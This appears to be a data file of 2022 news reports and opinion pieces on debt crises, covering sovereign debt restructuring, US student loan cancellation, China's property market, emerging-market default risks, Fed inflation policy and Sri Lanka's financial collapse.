The Russian war of aggression in Ukraine again highlights the high dependency and vulnerability of developing countries. The increased prices of food, energy and fertilisers, as well as the renewed disruption of supply chains, are already having a devastating impact. Inflation, the slump in trade growth, rising interest rates and a strong US dollar are exacerbating fiscal pressures. According to World Bank President David Malpass, more than 60 per cent of low-income countries are currently considered to be at acute risk of a debt crisis.

A sustainable solution to existing debt levels in developing countries is economically, geostrategically and morally appropriate and essential.

Revising the existing Framework

From an economic perspective, debt is neither good nor bad per se. It can promote growth and investment and have a counter-cyclical balancing effect. However, excessive debt levels pose risks to growth and stability and restrict fiscal space. So far, there is no fair and effective procedure for restructuring sovereign debt at the international level. The Common Framework of the G20 countries adopted in 2020 is a first - but not sufficient - step.

The Common Framework is intended to give countries the opportunity to negotiate the further handling of outstanding debts in case-by-case procedures. It is essential that each case is dealt with separately. The debt and creditor structures of individual countries are very different and require close examination. While the importance of China and private creditors has increased significantly in the past decade, their relevance depends strongly on the country-specific context. The reluctance of the G7 countries to push for a systematic restructuring mechanism should therefore not be justified by China's role.

Less than two years after its creation, the IMF and the World Bank are already calling for a revision of the Common Framework. This could be a step in the right direction: The goal must also be to include private creditors systematically and legally and to extend the framework to other highly indebted countries, for example among the emerging economies.

That a sustainable mechanism is also geostrategically important was not only made clear by the UN resolution of 2 March condemning Russia's war of aggression, which was not supported by several developing countries, among others. Putin's summit with African heads of state in Sochi in October 2019 painted a clear picture of Russian interests in and with Africa: it focussed on the sale of Russian armaments and nuclear technologies as well as military-technical cooperation. Against this background, it is more important than ever to support democratic partner countries that are faced with destabilising circumstances due to unsustainable debt levels. From the point of view of multilateral cooperation within the Bretton Woods system, a mechanism for restructuring sovereign debt in which creditor and debtor countries see eye to eye to find a constructive solution is in the interest of Germany.

Last but not least, a sustainable solution that counteracts the risk of sovereign debt crisis in developing countries is simply morally imperative. People in the poorest countries are the hardest hit by the global economic slowdown. Without decisive and coordinated action, the risk of a full-blown debt crisis in developing countries increases. And with that, hunger, poverty, and inequality will only worsen.

Long-term over short-term commitments

The high indebtedness was discussed intensively at the Spring Meeting of the IMF and the World Bank in Washington, DC in mid-April. German Finance Minister Christian Lindner announced that Germany would provide loans of 6.3 bn euros to the IMF's new Resilience and Sustainability Trust and another 100 million euros to the Poverty Reduction and Growth Trust for interest rate relief. Action must be taken now, Lindner stressed, warning of a 'global debt crisis'.

It would be more important than the additional loans announced by Christian Lindner to give critically indebted countries access to a codified mechanism for restructuring their sovereign debt.

The new short-term commitments by Germany's Federal Finance Minister are to be welcomed. However, further loans only give short-term respite and do not solve the problem. It would be more important than the additional loans announced by Christian Lindner to give critically indebted countries access to a codified mechanism for restructuring their sovereign debt.

In the coalition agreement, the traffic light coalition agreed to work towards a new consensus with regard to international debt management. An international procedure for sovereign insolvency, which includes all creditors and implements debt relief for particularly vulnerable groups of countries, is also to be supported.

This goal must be realised as soon as possible. It should be equally embedded in the strategy of German development policy, so that restructuring agreements with partner countries are accompanied by capacity-building programmes in finance ministries and central banks as well as by the promotion of good financial governance. German development cooperation is already well positioned to do so and can, together with the G7 countries, create an attractive offer.

With the G7 presidency, Germany now has a special opportunity to get the ball rolling. Finance Minister Lindner should use the meeting of the G7 finance ministers and central bank governors to push for the further development of the Common Framework and to establish a permanent and comprehensive mechanism for sovereign debt restructuring. As the second largest donor worldwide, Germany should take a clear leadership role.",Debt Crisis,2022-05-23 07:00:00

College students have been key allies in bolstering the fight to end the student debt crisis, joining the existing coalitions of borrowers who have been paying off their loans for years. Now, it looks like their activism is working. President Biden announced earlier this month that he is considering canceling some federal student debt. Student debt continues to impact more than 45 million Americans with a combined $1.7 trillion in debt, robbing retirees of their Social Security payments, workers of their wages, and students of their future.

This news from the White House is a major win on two fronts. First, before this announcement, the White House was investigating the president’s power to cancel student debt under the 1965 Higher Education Act. Experts, including those at Harvard Law School, have explored the matter in detail, concluding that the president has the unequivocal authority to cancel federal student debt, but it was unclear where the administration stood on the question. Biden’s announcement is therefore a huge win on the legal case on debt cancellation. Ultimately, the president’s authority to cancel all student debt is the most powerful tool Biden has to boost the economy, uplift families, and close the racial wealth gap. Even limited debt cancellation would set an important precedent.

Secondly, the White House’s announcement proves that the president can be moved on this issue. Student debt payments have been paused since March 2020, eligibility for forgiveness programs like the Public Service Loan Forgiveness program has been temporarily expanded, and student debt cancellation is firmly on the table. With it, student activists have helped push our nation and our president in the right direction on debt cancellation.

The Free the Degree coalition, which was started in February 2022, has seen explosive growth, with over 30 organizations nationwide joining the campaign, representing roughly 1.3 million college students in red and blue states alike. With help from the campaign, students at New Jersey’s Rutgers University–New Brunswick have circulated a letter pushing the White House to Double the Pell Grant and advance student debt cancellation, garnering support from leaders representing more than 450,000 students.

“Students must be involved in student debt advocacy because we are advocating for a secure financial future. More than ever, we see students who graduate put off major life plans, like starting a family or buying a house, to pay off major amounts of student debt,” Rutgers Student Assembly’s Legislative Affairs Chair Sean Tonra said. “So if we wish to see the lives we want, students from across the nation must get involved in student debt advocacy.”

Another powerful approach for student associations has been to pass resolutions calling on the president to cancel federal student debt. These resolutions are growing quickly and are bringing a new community of stakeholders to the campaign. In California, Colorado, New Jersey, and beyond, students have been using legislation to push the president toward debt cancellation. The letters and student government legislation go hand-in-hand with Congressional leaders—including Senate majority leader Chuck Schumer, Senator Elizabeth Warren, Representative Ayanna Presley–who are pushing the president to cancel $50,000 per student.

In-person actions like protests are equally critical to successfully getting debts canceled. One event took place in Washington, D.C., a few weeks ago, as the Debt Collective organization brought hundreds of borrowers and student activists, as far as New York and Ohio, for the April 4 Day of Action outside of the Department of Education.

As the president mulls over the decision to cancel debt, the movement continues to grow and push on multiple fronts. With the midterm elections on the horizon, now is the best time to demand that the president fulfill his campaign promise and cancel student debt. Biden was elected in 2020 with the help of young people—a key voting demographic—and the cancellation of student debt could supercharge his party’s prospects in November. If the president genuinely wants to “restore the soul of America,” he must do what he promised. It’s time end this moral and economic crisis by canceling student debt.",Debt Crisis,2022-06-01 07:00:00

Your Turn

Tallahassee Democrat columnist Bill Cotterell's recent column (“Wiping Out Student Loan Debt is Inherently Unfair”) leaves out many facts about federal student loans that people really need to know to understand the problem.

It is a common misconception, for example, that student loan borrowers are generally younger, liberal, successful, and that cancelling student loans would be an unnecessary burden on the taxpayer for the benefit of entitled “snowflakes” who don’t need or deserve it.

This is completely wrong.

Recent Department of Education data shows most student loan borrowers are over the age of 35. And that people over 50 with student loans outnumber people under 25, and they owe 300% more, on average, despite having borrowed far less decades ago.

They also are not mostly liberal. Pew Research from 2014 and more recent Gallup data show that a slight majority of people who have been to college identify, politically, as either Republican or independent.

Also, the claim that cancelling loans will mostly benefit wealthy people who don't need it is simply wrong. Seventy-five percent of all borrowers were ""underwater"" on their loans before the pandemic, according to Education Secretary Betsy DeVote in 2019.

All borrowers were determined to be ""financially needy"" as a condition for getting the loans. More than 40% never graduated. Millions went to trade schools. The bottom 80% of earners hold 70% of this debt, whereas most PPP loans (75%) went to the highest 20% earners.

Cotterell and others can also rest assured that the taxpayers will be fine. The federal government has been profiting around $50 billion per year on these loans since Obama federalized the program in 2010.

While it is not known how much of the $1.6 trillion federal portfolio is unpaid principal, it is certainly a small fraction of the total. On balance, the taxpayers will have very little- perhaps no, net loss if the loans are cancelled.

We just shoveled trillions in pandemic stimulus into the country. This required money to be drawn from the Treasury and added to the national debt. The President can cancel federal student loans, however, without needing one dime from the Treasury, or adding even a nickel to the national debt. There is literally no easier or cheaper way to stimulate the economy.

Because bankruptcy rights and other core protections were stripped from the loans, they have become both viciously predatory and hyperinflationary. In Florida, for example, the debt has exploded to where the $119 billion in student debt that now hangs over Floridians exceeds the entire state budget.

This could buy Disney World (assessed value: $2 billion) nearly 60 times over. These numbers are cartoonish and obscene.

People who wag their finger at the people being wrecked by this rather than looking at the lending system itself serve only to defend the worst, most threatening, big-government loan scam in US History, and the colleges that profit obscenely from it. That’s not conservative.

Cottrell and others should instead fight for S.2598, a bipartisan Senate bill that will return constitutional bankruptcy rights to the loans. That would at least be a start to reining in this federal beast.

HONG KONG, May 26 (Reuters) - China's property market, a key pillar of the world's second-largest economy, has weakened sharply in the past year as a result of a government clampdown on excessive borrowings by developers, and a COVID-19-induced economic slowdown.

So far this year, more than 100 cities have taken steps to boost home purchase demand via cuts in mortgage rates, smaller down-payments, and subsidies. However, the outlook remains bleak as the government enforces strict COVID curbs in dozens of cities, weighing on consumer confidence. read more

Analysts said the national housing inventory is at a high level, particularly in tier-three and four cities which face large de-stocking pressure due to slowing demand.

Property sales in April, by value, fell at their fastest pace in around 16 years despite more policy easing steps aimed at reviving the sector.

Further rate cuts this month aimed at easing home buyers' mortgage burden did little to convince investors and analysts that they could boost demand.

Fitch Ratings last month lowered its forecast on the property sales by value, expecting them to fall 25%-30% in 2022, compared to a previous forecast of 10-15% fall.

Financial regulators have pledged to keep credit growth stable in the property sector and help homebuyers affected by COVID-19 outbreaks to defer their mortgage payments, the central bank said in a statement on Tuesday.

Many private property developers have tightened their belts as they faced a slump in sales and struggled to access funding. It would take many more months before regulators' easing measures have a material impact on the market, they say.

Some developers are heeding Beijing's call and accelerating a push into asset-light businesses such as property services and commercial real estate to cut reliance on a high-debt, high-turnover model blamed for the liquidity crisis. read more

New construction starts plunged 44.19% in April from a year earlier, the fastest pace since January-February 2020 in the early days of the pandemic. Developers also slowed new construction as they tried to preserve capital, adding to uncertainties facing potential home buyers.

Yuan loan growth tumbled in April as the pandemic jolted the economy and weakened credit demand, official data showed earlier this month. Household loans, including mortgages, contracted by 217 billion yuan, pointing to a deep freeze in the market.

LONDON, May 24 (Reuters) - Rising borrowing costs and the worldwide fallout from the Russia-Ukraine war could see up to 10% of riskier 'junk'-rated emerging market countries suffer debt crises this year, analysts at U.S. investment bank JPMorgan have warned.

More acute balance of payment pressures and larger fiscal deficits are now compounding problems for heavily-indebted countries that import most of their energy and food.

Sri Lanka has just suffered its first ever sovereign default, joining a list that already included Lebanon, Suriname, Venezuela and Zambia. Russia and Ukraine are both teetering too and the worry is the numbers globally will soon balloon.

""Nearly half of the (52) country sample is classified as carrying high repayment risk in our assessment. Of these, eight are at risk of reserve depletion by the end of 2023, signalling high default risks. These are Sri Lanka, Maldives, Bahamas, Belize, Senegal, Rwanda, Grenada, and Ethiopia,"" said the note led by strategist Trang Nguyen on Tuesday.

A jump in world interest rates in response to fast-rising inflation also means many countries are facing the reality of rising borrowing costs, a departure from over a decade of so-called ""easy money"".

""Accounting for risks of a potential default in Russia and restructuring in Ukraine...the EM sovereign HY default rate could reach 10% this year,"" JP Morgan's note added, also pointing out how Ethiopia was moving towards a G20-led restructuring of its debts.

The International Monetary Fund too has said that nearly 60% of low income countries are either in, or at high risk of, debt distress.

Analysts at investment firm Tellimer this week highlighted how a record 27 emerging market countries now have eurobond yields above 10%.

Those yields are a proxy for what a government has to pay to borrow in the international capital markets and anything above 10% is generally seen as a sign of trouble.

JP Morgan said that in addition to the eight countries flagged as in immediate default danger, larger economies such as Egypt, Ghana and Pakistan were also highly vulnerable from fiscal and debt standpoints over the slightly longer term.

And no one else but the Fed can truly fix the inflation problem, as we have had to keep learning over the years.","Let's be clear about one thing: markets aren't in turmoil because the Fed might hike 75 basis points this week. They're in turmoil because inflation is really bad, and no one has yet stepped up to declare--like Mario Draghi of Europe did when their debt crisis was reaching a climax--that the central bank will do ""whatever it takes"" to fix the problem.

Of course the Fed wants to ""balance"" the inflation fight against the risks of sending the economy into recession. Unfortunately, inflation is proving just as damaging to Americans. Consumer sentiment just plunged to a record low in the University of Michigan's 75-year series history. It's worse now, in other words, than at any point in any prior recession since 1952. Is this what success is supposed to look like?

It's not. It's a clear failure. And worse, there's no relief in sight. Even if Russia ends the war on Ukraine and its energy supplies return to the global market, the world is under-supplied in oil right now. Global demand is higher than supply, even including Russian barrels. The unexpectedly sharp rebound in demand has tightened markets of all types to the point of breaking, and it was global stimulus that juiced us to this point, before pandemic-hit supply chains were ready to handle it.

Now, no one can keep up with demand because we literally don't have enough workers, and the resulting wage pressures are spreading inflation throughout every aspect of the economy. The global stimulus created a curious problem: too many jobs all at once. There just aren't enough available workers to fill all the jobs employers need filled right now. The market is quickly trying to find a clearing point through (a) resetting pay higher, and (b) destroying ""phantom"" job openings like those in stimulus-juiced industries (crypto, anyone?) that were more or less a mirage.

The Fed at best can get out of the way and not counteract this process right now. By pivoting to rate hikes and balance sheet shrinkage, it is at least slowing the amount of stimulus it's adding to the economy--stimulus that would worsen these problems. The fact that so much of the economy's ""nominal"" growth is being eaten up by inflation right now is plain evidence that policy overshot. The U.S. should be growing around 4-5% a year nominally, or 2-3% in real terms after inflation. Instead, we exploded to almost 10% nominal growth last year, and each quarter we have less ""real"" growth leftover to show for it, because it's all going into inflation.

And--the Fed is still running expansionary policy! Don't be fooled by the rate hikes and ""quantitative tightening."" If the ""neutral"" level of interest rates is at least 2.5% right now (and it's probably higher, because inflation is so high), then any rate below that level is stimulative. They could hike 75 basis points this week and that only puts them in the 1.5% to 1.75% range--still way below neutral, let alone ""tight"" monetary policy.

And yes, the balance sheet reduction also counts towards that goal, but it's not clear by how much. One recent paper suggests $2 trillion in reduction over 3 years is only equal to about 30 basis points of rate hikes; 90 basis points if markets are extremely risk averse. Put differently, QT raises the odds of a financial markets ""accident"" and is necessary to avoid leaving too much inflationary dry powder in the economy, but doesn't equal much in terms of tightening policy.

This is why interest rates are once again spiking higher, especially since the super-high CPI report last Friday. The 10-year Treasury yield nearly hit 3.3% this morning; that means the 30-year fixed mortgage rate will probably cross above 6% by this afternoon. The market isn't just trying to figure out the odds of a 75-basis-point rate hike this week, but calculating just how much more the Fed needs to do against how much it is willing to do right now, and how much worse inflation will be for how many more months as a result.

Would markets freak out if Fed Chair Powell came to the podium on Wednesday and said, bluntly, the Fed will do ""whatever it takes"" to bring inflation back down quickly to their 2% target? After all, markets are already freaking out! The Dow just had its worst losing streak in almost a century. The dollar is soaring, which is never good. The S&P reentered a bear market with the renewed selling pressure this morning.

What's worse, for us to linger here for months with continued macro uncertainty, feeling like we're in a recession anyhow? Or to have the Fed move more quickly to truly tighten policy, and give markets some much-needed clarity on the preeminence of their inflation-fighting goal? Congress may have given them a ""dual mandate"" on price stability and full employment, but it forgot the lesson from Scripture; ""man cannot serve two masters."" And no one else but the Fed can truly fix the inflation problem, as we have had to keep learning over the years.

COLOMBO, Sri Lanka -- China says its initiative to build ports and other infrastructure across Asia and Africa, paid for with Chinese loans, will boost trade. But in a cautionary tale for borrowers, Sri Lanka's multibillion-dollar debt to Beijing threatens to hinder efforts to resolve a financial crisis so severe that the Indian Ocean nation cannot import food or gasoline.

Sri Lanka’s struggle is extreme, but it reflects conditions across dozens of countries from South Pacific islands through some of the poorest in Asia and Africa that have signed onto Chinese President Xi Jinping’s Belt and Road Initiative. The total debt of poor countries is rising, raising risks others might run into trouble.

Sri Lanka's 22 million people are in dire straits. Foreign currency ran out in April, leading to food shortages, power cuts and protests that forced a prime minister to resign. Payment on $51 billion of debt to China, Japan and other foreign lenders was suspended.

Sri Lanka and other poor Asian countries welcome Chinese financing. The Asian Development Bank says the region needs to invest $1.7 trillion a year in infrastructure to keep economies growing. But some, including Sri Lankan critics of their government’s spending, say Chinese-led projects cost too much or do too little for their economies.

China ranks third among Sri Lanka's creditors after Japan and the ADB and accounts for 10% of the debt, but Xi’s government has an outsize potential to disrupt a settlement.

Beijing promised to “play a positive role” in talks with the International Monetary Fund on a possible emergency loan. China offered to lend more but balked at joining a process that might cut Sri Lanka’s debt, possibly for fear other Belt and Road borrowers that owe tens of billions of dollars will demand the same relief.

“If China gives a concession to Sri Lanka, it will have to give the same concession to other borrowers,” said economist W.A. Wijewardena, a former deputy governor of the Sri Lankan central bank. “They didn’t want to get into that trouble.”

If China tries to avoid debt cuts, that might disrupt the IMF talks or prompt private sector creditors to hold out for more money, experts say.

Lack of cooperation by Beijing “would complicate Sri Lanka’s debt recovery journey,” said Aditi Mittal of Verisk Maplecroft, a consulting firm, in an email.

The United States, Japan, the European Union and other governments also lend, but on a smaller scale. Many Belt and Road countries attract little nongovernment financing because they are deemed too risky or lack a legal framework for investment in infrastructure.

Some governments have run into smaller crises. Truck drivers in Kenya protested after their government imposed a fuel tax to pay for a Chinese-built railway the drivers complained would compete with them.

Others have canceled or scaled back projects. Malaysia scrapped a planned railway in 2019 as too expensive. Thailand renegotiated a high-speed railway following protests that too little work went to Thai companies.

China has restructured some debt. Ethiopia persuaded Beijing in 2018 to forgive some interest and stretch out repayment of a 10-year loan for a $4 billion railway to 30 years. That reduced annual payments but added two more decades of interest charges.

Chinese officials say Belt and Road projects are business ventures, not aid. Most lending is on commercial terms. Details often are secret.

Belt and Road rankles Washington, Moscow, Tokyo, New Delhi and other governments that grumble Beijing, the biggest trading partner for all of its neighbors, is trying to expand its influence and undercut theirs.

Opposition figures say while Sri Lanka needs China to reduce its debt, blame lies with leaders who built unrealistic projects that cannot pay for themselves while they failed to invest in economic development.

Foreign loans “built highways, airports and convention halls in the jungles which didn’t give any returns” in foreign currency, said a lawmaker, Kabir Hashim. “Now we don’t have the dollars to pay them back the dollar loans.”

Critics cite a Chinese-built port in Hambantota in the southeast as a prime example of official recklessness.

It was built in the hometown of then-President Mahinda Rajapaksa and paid for with $1.1 billion in Chinese loans despite the plan having been rejected by an expert panel.

Its promoters said Hambantota, on busy Indian Ocean shipping routes, would ease the burden on Sri Lanka’s main port in Colombo. But it failed to generate foreign revenue.

Beijing bailed out the port in 2017 by having a state-owned company, China Merchants Group, buy a 99-year lease for $1.1 billion. That includes land for an industrial park.

The deal gave Sri Lanka cash to repay Chinese banks but prompted accusations official bungling gave a foreign government control over part of the country.

Chinese loans also paid for an international airport near Hambantota. Few airlines use it.

The crisis reignited accusations Beijing used a “debt trap” to gain influence over the country.

“They knew we had no capacity to repay,” said a legislator, Wijeyadasa Rajapakshe.

“We must convince China to forgo at least part of the loans,” said Rajapakshe. “Ordinary poor people, without one meal per day, are paying this debt now.”

Sri Lanka owes $7 billion this year to Chinese banks and other lenders but suspended payment April 13 while it talks with the IMF. The government also owes $25 billion, or about half its total, to private sector bond investors.

A restructuring agreement with China or Japan would be a “positive signal” for a recovery, wrote Mittal.

In a written response to questions, the Chinese foreign ministry said Beijing is ready to “play a positive role in easing Sri Lanka’s debt burden” but gave no indication whether the amount owed might be reduced.

“China is willing to support relevant financial institutions to negotiate with Sri Lanka,” the ministry said.

In April, then-opposition leader Ranil Wickremesinghe told broadcaster Republic TV that China offered a $1 billion loan instead of reducing Sri Lanka’s debt. That would allow the government to make payments, but the total owed would rise.

Wickremesinghe took over as prime minister on May 12 after Majapaksa, who in an earlier role as president built the Hambantota port, resigned.

Chinese Ambassador Qi Zhenhong told reporters April 25 that negotiating with the IMF would interfere with Beijing’s loan offer. The IMF usually requires a borrower to work out a deal with all creditors to reduce debts.

China has avoided joining the London Club of government lenders, the forum for negotiating debt cuts.

The central bank governor warned that China and other creditors must accept the same terms.

“It is not fair to treat one creditor differently to others,"" said Nandalal Weerasinghe. ""Then the others won’t come onboard.”

Even if Beijing balks, Sri Lanka can’t afford to alienate China, its biggest potential lender and investor, said Wijewardena.

“Sri Lanka is not in a position to say no,” he said.

More than 45 million Americans – more than the population of California – now owe a collective $1.7tn in student debt.

What to do about that debt has become a hot political issues as midterm elections approach.

The vast majority of the money is owed to the federal government, which has been backing or directly offering student loans for higher education since 1958. While student loans are not new in the United States, the amount of student debt has more than tripled over the last 16 years.

The Biden administration has recently hinted that some form of student debt forgiveness could be announced soon – specifically, canceling at least $10,000 in student debt for Americans earning less than $125,000 a year. With that threshold, most student loan borrowers will qualify for some debt forgiveness.

If the executive action is undertaken, it will be the first large debt cancellation by the federal government to address the student debt crisis. Understanding the impact of such a dramatic policy requires unpacking the student debt crisis, beginning with its origins.

How the student debt crisis started

In 1957 the Soviet Union successfully launching the first earth-orbiting satellite, Sputnik. With the cold war raging the federal government feared the US education system was failing to produce enough scientists and engineers to compete with the Soviets and, in 1958, started handing out student loans through the National Defense Education Act.

Nearly a decade later, the Higher Education Act of 1965 allowed more people to take out loans as the federal government promised to pay back banks for any loans that were not repaid.

“It all started from this choice, which I think was a terrible choice, to decide that as a policy matter we should support higher education … by giving [students] an opportunity to get a loan,” said Dalié Jimenez, professor of law and director of the Student Loan Law Initiative at the University of California at Irvine. “It was just a terrible mistake.”

Starting in 2010, the federal government started directly lending money to student borrowers. In the wake of the Great Recession, the amount of student debt began to increase rapidly. Colleges were seeing increased enrollment as people left the workforce to go back to school. States slashed their higher education budgets, leading to higher tuition. More students were turning to for-profit colleges, which tend to be more expensive than public colleges.

Over the last few years, the amount of grant aid, which does not need to be paid back, has risen. Yet despite this appearance of more financial support for students to attend college, the cost of attendance has remained the same.

The cost of attending public college has actually increased at a higher rate than the cost to attend a private college. The net cost of attendance for four-year public colleges, which takes into account any grants students receive, went from $17,500 in 2006 to $20,210 in 2016, according to data from College Board.

“That era 10 years ago was a really formative moment for producing a lot of debt that’s still out there,” said Kevin Miller, associate director for higher education at the Bipartisan Policy Center’s Economic Policy Project. “The cost of college attendance has gone up a lot while household incomes in the United States haven’t … there’s a real sense that if grant, state or institutional aid isn’t filling the gap, that just leaves debt as the only option.”

What student debt looks like today

For the 2021-2022 school year, the average cost of tuition and fees for a four-year public college is $10,740. The cost is nearly quadrupled for private institutions, at an average of $38,070. Even with grant aid, the cost of attendance is an average of $19,230 for public institutions and $32,720 at private schools.

Estimates put the average debt of those in the class of 2019 who took out student loans at $28,950. The number is close to the maximum $31,000 that students who are dependents of parents or guardians can borrow from the federal government to fund undergraduate education.

Continuing racial wealth disparities are reflected in who has to take out loans to fund college. About half of Black college students take out student loans, compared with 40% of white students. Black Americans owe an average of $25,000 more in debt than their white counterparts and are more likely to be behind on their payments.

Despite the amount of debt many students need to take on to attend college, nearly 20 million Americans still enroll in college every year. While earnings can depend on a person’s industry, those with a bachelor’s degrees earn 75% more in their lifetime than those with just a high school diploma.

“The message is you have to get a college degree. It’s not just a rhetorical message, it’s an actual truth that if you don’t have a college degree, particularly if you are Black or brown … you will not be able to get a job that is better than your parents’,” Jimenez said.

Those with graduate and professional degrees earn even more, but the price for an advanced degree is even higher. A good chunk of student debt – about 40% – is held by those who took out loans to pay for graduate school.

What the government has done to address student debt

The most substantial policy addressing student debt was first implemented by the Trump administration, which paused student loan payments and interest accrual at the beginning of the Covid-19 pandemic. Both Trump and Biden extended the pause over the last two years, and it is now set to expire on 31 August.

Since the beginning of this year, Biden has announced a slate of additional policies alongside the pause extension. Those who have defaulted or are delinquent on their federal student loans will be returned to good standing. Biden forgave $415m in student debt for borrowers who attended predatory for-profit schools.

His administration also announced changes to the Public Service Loan Forgiveness Program, which forgives the student loans of borrowers who are non-profit and government employees after 10 years of debt or after 120 payments are made. Over 113,000 borrowers with a cumulative $6.8bn in debt are now eligible for forgiveness. Over the years, the program has been under much criticism, as relief through the program was rare and borrowers were often deemed not qualified for logistical reasons.

The debate over debt forgiveness

Even as it seems Biden is prepared to cancel some debt, the idea has gotten some criticism over the last few months.

Republicans have been using student debt as a talking point against Biden as the midterm elections start rolling.

Senator Mitt Romney suggested that Democrats canceling student loans is a way of bribing voters. “Other bribe suggestions: Forgive auto loans? Forgive credit card debt? Forgive mortgages?” he wrote on Twitter. JD Vance (who went to Yale Law School) told the Washington Post that “Biden essentially wants blue-collar workers like truck drivers – who didn’t have the luxury of going to college to get drunk for four years – to bail out a bunch of upper-middle-class kids.”

The reality is that the student loans of those in the highest income quartile – people making more than $97,000 – do make up a third of all outstanding student debt. But many low-income Americans also have student debt, though the amount of debt they have is smaller. Those making below $27,000 a year make up 17% of all borrowers, but their loans comprise 12% of all the outstanding debt.

An income threshold could be a way for the government to target forgiveness to those who need it most. But some have pointed out that an income ceiling does not take into consideration a person’s wealth.

“You’re looking at a snapshot of what your income was this year or last year, that tells you very little,” Jimenez said. “If your family has no wealth, you’re very differently situated from someone who has family wealth or personal wealth from previous careers.”

Those who have been advocating for student debt cancellation say that $10,000 in forgiveness will not be enough to address the breadth of the crisis. Democratic lawmakers, including Senate majority leader Chuck Schumer, Senator Elizabeth Warren and Representative Alexandria Ocasio-Cortez, have called on Biden to cancel up to $50,000.

“I don’t believe in a cutoff, especially for so many of the frontline workers who are drowning in debt and would likely be excluded from relief,” Ocasio-Cortez told the Washington Post. “Canceling $50,000 in debt is where you really make a dent in inequality and the racial gap. $10,000 isn’t.”

Ending the student debt crisis for good

Even if Biden forgives some student debt, future college students will continue to take out loans – and at higher interest rates. Tackling the price tag of college will come with its own complications, but advocates say it will be necessary to ensure student debt does not get worse.

While Biden’s plan for free community college was killed along with the rest of the social and climate spending bill that was making its way through Congress, some efforts for better college funding are happening at the local level.

In March, the governor of New Mexico signed a bill that would use $75m in state funds to cover tuition and fees for undergraduate students at two- and four-year colleges. Drives for similar government support have been seen in Pennsylvania, California and Maine.

“The cost of college is too high for a lot of students to manage without debt. Making it so that students can go without debt or take less debt in the first place is the thing that we really need to be focusing on,” Miller said. “What about the next generation or the one after that?”",Debt Crisis,2022-05-26 07:00:00

Last week the parliamentary speaker warned of an imminent hunger crisis. This week the “new” prime minister, Ranil Wickremesinghe, a septuagenarian on his fifth stint as PM since the 1990s, warned that the country had run out of petrol, and that it desperately needed $75m of foreign currency to pay for essential imports to avoid social collapse. For months, the government of president Gotabaya Rajapaksa has been struggling to cope with an inflationary spiral and a lack of foreign reserves that has led to shortages of food, fuel and medicines, and rolling power cuts. In recent weeks, public anger has spilled over onto the streets. There have been multiple cabinet reshuffles and failed attempts to form a national unity government. But so far Rajapaksa has clung on – albeit without a fully functioning government – in part because the opposition doesn’t fancy the job of fixing his mess. What’s caused the crisis? A mix of long-run factors and shorter-term triggers. Sri Lanka’s economy has long been dominated by export-orientated crops and more recently the garment industry. Its economy is therefore highly vulnerable to global economic downturns and external shocks, with declines in exports driving regular balance-of-payments crises from the mid-1960s onwards.

Still, until now post-independence Sri Lanka has never defaulted on its sovereign debt and was a relative success story by South Asian standards. What went wrong? Gotabaya Rajapaksa is from one of Sri Lanka’s dominant political families with influence dating back to the 1930s. In 2005 Mahinda Rajapaksa, Gotabaya's brother, was elected president, and many other members of the family have taken up senior positions since then. Even before the Rajapaksas took power, “financial trouble was brewing”, says Karl Schultz on Bloomberg. During the family’s first stint in office (under the presidency of Gotabaya’s brother Mahinda in 2005-2015), the government took out big loans from China to invest in infrastructure projects. But many of those stalled and foreign debt more than doubled between 2010 and 2020. Things got worse from 2019, due to a combination of terrible luck and disastrous policy decisions. In April that year, Sri Lanka’s thriving $4.4bn tourism sector took a big blow from a series of church bombings that killed nearly 300 people, including some foreign nationals. What was the effect of that? Tourism collapsed by as much as 80%, and then the following spring the pandemic hit, making any recovery impossible. Together, these blows would have challenged any government. But the Rajapaksas proved unequal to the task. Gotabaya Rajapaksa was popular for bringing an end to the 26-year civil war as a head of the ministry of defence in 2009, during the time when Mahinda was president. Though accused of war crimes in the fight against the Tamil Tigers – and corruption – he was elected by a landslide in 2019 on a security-focused platform in the wake of the bombings. He then brought Mahinda back as PM, along with several more relatives as ministers. But “untrammelled authority seems to have gone to the Rajapaksas’ heads”, says The Economist. What have the Rajapaksas done wrong? First, they immediately pushed through massive but unaffordable tax cuts that seriously weakened the government’s finances, despite warnings that they were recklessly dangerous. They then failed to reverse course as the pandemic halted tourism, downgrades closed the door to fresh borrowing and foreign reserves dwindled.",Debt Crisis,2022-05-19 07:00:00

As the COVID-19 pandemic takes its toll on Africa, not only precious lives have been lost, but also some of the world's poorest countries are slipping further into the grip of a debt crisis. The IMF recently warned that no fewer than 20 countries in Sub-Saharan Africa are either already in debt distress or at high risk of debt distress. To find a way out, it is important to answer a key question first: who is responsible for Africa's debt crisis?

The biggest lenders

Africa's external debt buildup dates back to the 1970s, when massive surplus capital in Western banks following oil price surges led to imprudent lending from OECD members to developing countries, including vigorous loan extensions without careful credit analysis. From 1970 to 1987, the ratio of total external debt to GDP in African countries skyrocketed from an estimated 16% to 70%.

When the 1980s global recession struck, rises in interest rates of developed countries resulted in soaring interest payments for African debtors over market-based loans, further aggravating their debt burden. In an attempt to tackle the problem, the World Bank's Structural Adjustment Program (SAP) resorted to austerity measures that ended up with large current account deficits, astronomical inflation and depressed currencies in Africa, forcing the World Bank and the IMF to provide debt relief in 1996, a traumatic start for Breton Woods institutions' involvement.

The 21st century has witnessed an expansion of loans from the World Bank and the IMF to Sub-Sahara Africa, and unsettled multilateral debt obligations rose 88% from $58.7 billion to $110.45 billion between 2010 and 2018. A Jubilee Debt Campaign study in 2018 suggested that multilateral institutions, mostly US-dominated, accounted for 35% of African governments' external debts, while the private sector, China and Paris Club countries accounted for 32%, 20% and 10% each.

A vicious cycle

What explains African governments' continual borrowing that leads to increased debt, growing costs and eventual default?

One prominent explanation is that the SAP and the like have derailed African countries' political and economic reforms, and undermined their sovereignty and social systems while benefiting external forces. Exploiting the multilateral institutions, Western creditors minimized African governments' ability to regulate domestic economy, and secured for mostly Western multinational companies easy access to local labor forces and resources.

Zimbabwe, for example, once a success story in the 1980s and the early 1990s, was plunged into an economic crisis with far slower GDP growth after adopting the SAP. Disproportional budget austerity under the program severely hindered the country's human capital development and public welfare investment, resulting in mass unemployment and social unrest in 1998. In 2003, risking being expelled from the IMF over dues unpaid since 2001, Zimbabwe had no choice but to embark once again on the doomed cycle of implementing IMF-dictated reforms to qualify for new aids.

Ideally, external debt should contribute to production, boost growth, create jobs, and bring tax revenue and foreign exchange, so as to enable debt repayments on the basis of sustainable development. Disappointingly, the Joint World Bank-IMF Debt Sustainability Framework for Low-Income Countries has largely failed to open up promising prospects for the recipients. Of all the countries that have been bailed out by the IMF, 11 relied on its aid for at least 30 years; 32 were borrowers for 20 to 29 years; and 41 used IMF credit for 10 to 19 years.

